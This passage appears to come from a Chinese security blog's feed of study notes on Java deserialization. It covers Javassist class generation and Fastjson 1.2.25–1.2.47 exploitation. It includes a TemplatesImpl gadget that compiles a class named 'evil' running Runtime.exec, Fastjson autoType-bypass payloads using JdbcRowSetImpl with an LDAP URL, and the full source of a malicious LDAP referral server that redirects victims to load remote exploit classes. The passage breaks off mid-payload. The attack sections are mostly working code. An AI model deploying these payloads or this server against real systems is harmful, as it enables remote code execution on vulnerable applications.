class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aClass.newInstance();<br><span class="hljs-type">Hello</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>();<br></code></pre></td></tr></table></figure><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><p>个人感觉上面的Demo1用处不大，感觉类似动态代理（但是不如动态代理），但是会将原有的类的方法全部覆盖了。（纯属个人理解！！！）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, InstantiationException, IllegalAccessException, ClassNotFoundException, SecurityException, NoSuchMethodException, IllegalArgumentException, InvocationTargetException, InvocationTargetException &#123;<br>        <span class="hljs-comment">// 创建类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;person&quot;</span>);<br><br>        <span class="hljs-comment">// 添加私有成员name及其getter、setter方法</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, cls);<br>        param.setModifiers(Modifier.PRIVATE);<br>        cls.addMethod(CtNewMethod.setter(<span class="hljs-string">&quot;setName&quot;</span>, param));<br>        cls.addMethod(CtNewMethod.getter(<span class="hljs-string">&quot;getName&quot;</span>, param));<br>        cls.addField(param, CtField.Initializer.constant(<span class="hljs-string">&quot;&quot;</span>));<br><br>        <span class="hljs-comment">// 添加无参的构造体</span><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;&#125;, cls);<br>        cons.setBody(<span class="hljs-string">&quot;&#123;name = \&quot;h3h3h3h3\&quot;;&#125;&quot;</span>);<br>        cls.addConstructor(cons);<br><br>        <span class="hljs-comment">// 添加有参的构造体</span><br>        cons = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>)&#125;, cls);<br>        cons.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<br>        cls.addConstructor(cons);<br><br>        <span class="hljs-comment">// 打印创建类的类名</span><br>        System.out.println(cls.toClass());<br><br>        <span class="hljs-comment">// 通过反射创建无参的实例，并调用getName方法</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;person&quot;</span>).newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getter</span> <span class="hljs-operator">=</span> o.getClass().getMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        System.out.println(getter.invoke(o));<br><br>        <span class="hljs-comment">// 调用其setName方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">setter</span> <span class="hljs-operator">=</span> o.getClass().getMethod(<span class="hljs-string">&quot;setName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;);<br>        setter.invoke(o, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(getter.invoke(o));<br><br>        <span class="hljs-comment">// 通过反射创建有参的实例，并调用getName方法</span><br>        o = Class.forName(<span class="hljs-string">&quot;person&quot;</span>).getConstructor(String.class).newInstance(<span class="hljs-string">&quot;xsw6_a&quot;</span>);<br>        getter = o.getClass().getMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        System.out.println(getter.invoke(o));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>等效与这样？</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        System.out.println(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonTrue</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) &#123;<br>        Person person = <span class="hljs-keyword">new</span> <span class="hljs-type">Person</span>();<br>        System.out.println(person);<br>        person.setName(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        person.getName(<span class="hljs-string">&quot;xsw6_a&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在后续的学习中会不断来更新的。因为我感觉这个学的有点模糊。</p><h2 id="利用javasist实现TemplatesImp"><a href="#利用javasist实现TemplatesImp" class="headerlink" title="利用javasist实现TemplatesImp"></a>利用javasist实现TemplatesImp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring2Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, TransformerConfigurationException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">abstractTranslet</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(new String[]&#123;\&quot;calc\&quot;&#125;);&quot;</span>;<br>        clazz.makeClassInitializer().insertBefore(cmd);<br>        clazz.setSuperclass(abstractTranslet);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setValue(<span class="hljs-string">&quot;_bytecodes&quot;</span>, templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;);<br>        setValue(<span class="hljs-string">&quot;_name&quot;</span>, templates, <span class="hljs-string">&quot;a&quot;</span>);<br>        setValue(<span class="hljs-string">&quot;_tfactory&quot;</span>, templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(String name, Object target, Object value)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> target.getClass().getDeclaredField(name);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            field.set(target, value);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception ignore) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（1.2.25-1.2.47）</title>
    <link href="/2022/03/09/Fastjson%EF%BC%881-2-25-1-2-47%EF%BC%89/"/>
    <url>/2022/03/09/Fastjson%EF%BC%881-2-25-1-2-47%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-25-1-2-47"><a href="#Fastjson1-2-25-1-2-47" class="headerlink" title="Fastjson1.2.25-1.2.47"></a>Fastjson1.2.25-1.2.47</h1><p>通杀版本。</p><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</li></ul><p>这里还是一样要用到ldap。配置按照<strong>1.2.45</strong>所需要的环境配置。</p><h1 id="为什么这里不开启AutoTypeSupport也可以"><a href="#为什么这里不开启AutoTypeSupport也可以" class="headerlink" title="为什么这里不开启AutoTypeSupport也可以"></a>为什么这里不开启AutoTypeSupport也可以</h1><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091302366.png" alt="QQ截图20220309123409"></p><p>没有进入黑名单删选。<br>跟进。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091304938.png" alt="QQ截图20220309124256"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091302374.png" alt="QQ截图20220309124530"></p><p>发现这里会将com.sun.rowset.JdbcRowSetImpl加载进缓存中。<br>就相当于这一次是利用缓存加载出<strong>com.sun.rowset.JdbcRowSetImpl</strong>绕过了各种黑名单。</p><h2 id="开启AutoTypeSupport时"><a href="#开启AutoTypeSupport时" class="headerlink" title="开启AutoTypeSupport时"></a>开启AutoTypeSupport时</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091258692.png" alt="QQ截图20220309125840"></p><p>由于加载了缓存。这里会显示null，所以就进不去黑名单。<br>至此fastjson就告一段落。后续官方直接禁止了缓存类加载。over。</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;a\&quot;:&#123; \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;, \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, \&quot;b\&quot;:&#123; \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson（1.2.25-1.2.45）</title>
    <link href="/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-45%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-45%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-25-1-2-45"><a href="#Fastjson1-2-25-1-2-45" class="headerlink" title="Fastjson1.2.25-1.2.45"></a>Fastjson1.2.25-1.2.45</h1><p>这里通过<strong>JNDI+LDAP</strong>绕过。<br>创建Ldap服务需要。<br><code>unboundid-ldapsdk</code>包(<a href="https://repo1.maven.org/maven2/com/unboundid/unboundid-ldapsdk/5.1.3/unboundid-ldapsdk-5.1.3.jar)%E5%AF%BC%E5%85%A5idea%E5%B0%B1%E5%8F%AF%E3%80%82">https://repo1.maven.org/maven2/com/unboundid/unboundid-ldapsdk/5.1.3/unboundid-ldapsdk-5.1.3.jar)导入idea就可。</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.45<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>      <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="LDAP服务搭建"><a href="#LDAP服务搭建" class="headerlink" title="LDAP服务搭建"></a>LDAP服务搭建</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:80/#Exploit&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1389</span>;<br><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                    <span class="hljs-string">&quot;listen&quot;</span>,<br>                    InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                    port,<br>                    ServerSocketFactory.getDefault(),<br>                    SocketFactory.getDefault(),<br>                    (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br>            e.addAttribute(<span class="hljs-string">&quot;javaCodeBase&quot;</span>, cbstring);<br>            e.addAttribute(<span class="hljs-string">&quot;objectClass&quot;</span>, <span class="hljs-string">&quot;javaNamingReference&quot;</span>);<br>            e.addAttribute(<span class="hljs-string">&quot;javaFactory&quot;</span>, <span class="hljs-built_in">this</span>.codebase.getRef());<br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>并且这里因为我本人不了解其代码。这里的恶意类我没有在添加自己的路径。（xsw6a.Exploit），需要重新向phpstudy中传入不带package的恶意类。</strong></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这里其实跟之前利用TemplateImpl利用链子差不多。<strong>这里会调用setter方法触发lookup（）</strong>并且其中的参数可控。之前是会调用getter方法。（这里还是要调试很久，并且有一些类我们是无法跟进去调试的。）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203082245220.png" alt="QQ截图20220308224443"></p><p>可控<strong>data_source</strong>,触发漏洞。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span 